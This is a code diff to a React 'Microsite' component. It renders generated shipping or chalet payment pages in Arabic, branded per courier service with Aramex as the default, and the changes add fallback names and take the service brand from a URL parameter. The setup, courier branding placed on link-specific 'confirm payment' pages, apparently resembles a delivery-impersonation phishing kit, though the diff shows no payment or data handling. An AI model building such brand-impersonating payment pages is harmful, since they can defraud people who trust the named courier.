@@ -18,12 +18,13 @@ import {
   Package,
   Truck,
   Hash,
+  RefreshCw,
 } from "lucide-react";
 
 const Microsite = () => {
   const { country, type, id } = useParams();
   const navigate = useNavigate();
-  const { data: link, isLoading } = useLink(id);
+  const { data: link, isLoading, error } = useLink(id);
   const countryData = getCountryByCode(country || "");
   
   if (isLoading) {
@@ -47,9 +48,14 @@ const Microsite = () => {
   
   const payload = link.payload;
   
+  // Determine if it's a shipping or chalet link FIRST
+  const isShipping = link.type === 'shipping';
+  
   // Get service branding for SEO and display
-  const serviceName = payload.service_name || payload.chalet_name;
-  const serviceKey = payload.service_key || 'aramex';
+  const serviceName = isShipping 
+    ? (payload.service_name || 'خدمة الشحن')
+    : (payload.chalet_name || 'شاليه');
+  const serviceKey = payload.service_key || (new URLSearchParams(window.location.search).get('service') || 'aramex');
   const serviceBranding = getServiceBranding(serviceKey);
   
   // Update URL to include service information for better SEO
@@ -66,19 +72,17 @@ const Microsite = () => {
   const serviceData = allServices.find(s => s.key === serviceKey);
   const serviceDescription = serviceData?.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
   
-  // Determine if it's a shipping or chalet link
-  const isShipping = link.type === 'shipping';
   const displayName = isShipping 
     ? `شحنة ${serviceName}` 
-    : payload.chalet_name;
+    : (payload.chalet_name || 'شاليه');
   
   // SEO metadata
   const seoTitle = isShipping 
     ? `تتبع وتأكيد الدفع - ${serviceName}` 
-    : `حجز شاليه - ${payload.chalet_name}`;
+    : `حجز شاليه - ${payload.chalet_name || 'شاليه'}`;
   const seoDescription = isShipping
     ? `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
-    : `احجز ${payload.chalet_name} في ${countryData.nameAr} - ${payload.nights} ليلة لـ ${payload.guest_count} ضيف`;
+    : `احجز ${payload.chalet_name || 'شاليه'} في ${countryData.nameAr} - ${payload.nights || 1} ليلة لـ ${payload.guest_count || 2} ضيف`;
   const seoImage = serviceBranding.ogImage || serviceBranding.heroImage || '/og-aramex.jpg';
   
   return (
@@ -114,7 +118,7 @@ const Microsite = () => {
             >
               <div className="absolute inset-0 bg-black/20" />
               <div className="absolute bottom-4 right-6 text-white">
-                <h1 className="text-3xl font-bold">{payload.chalet_name}</h1>
+                <h1 className="text-3xl font-bold">{isShipping ? serviceName : (payload.chalet_name || 'شاليه')}</h1>
                 <p className="text-lg opacity-90">{countryData.nameAr}</p>
               </div>
             </div>
@@ -193,7 +197,7 @@ const Microsite = () => {
                       <div>
                         <p className="font-semibold mb-1">الموقع</p>
                         <p className="text-muted-foreground text-sm">
-                          {payload.chalet_name}
+                          {isShipping ? serviceName : (payload.chalet_name || 'شاليه')}
                         </p>
                       </div>
                     </div>
